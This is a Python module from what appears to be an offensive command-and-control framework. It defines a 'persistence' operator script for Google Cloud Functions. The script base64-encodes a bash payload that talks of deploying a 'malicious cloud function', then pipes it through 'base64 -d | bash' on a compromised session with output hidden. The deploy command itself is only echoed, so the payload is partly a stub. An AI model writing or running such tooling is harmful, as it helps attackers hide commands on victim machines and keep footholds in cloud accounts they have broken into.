"""GCP Cloud Function persistence script."""
from ..base import OperatorScript, ScriptResult

class CloudFunctionPersist(OperatorScript):
    name = "Cloud Function Persistence"
    description = "GCP Cloud Function persistence"
    category = "persist"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] GCP CLOUD FUNCTION PERSISTENCE"
if command -v gcloud &>/dev/null; then
    echo "[+] Deploy malicious cloud function"
    echo "gcloud functions deploy update --runtime python39 --trigger-http --entry-point main"
fi
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Cloud function persistence...[/bold cyan]")
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            return ScriptResult(success=True, output="Cloud function persistence executed")
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
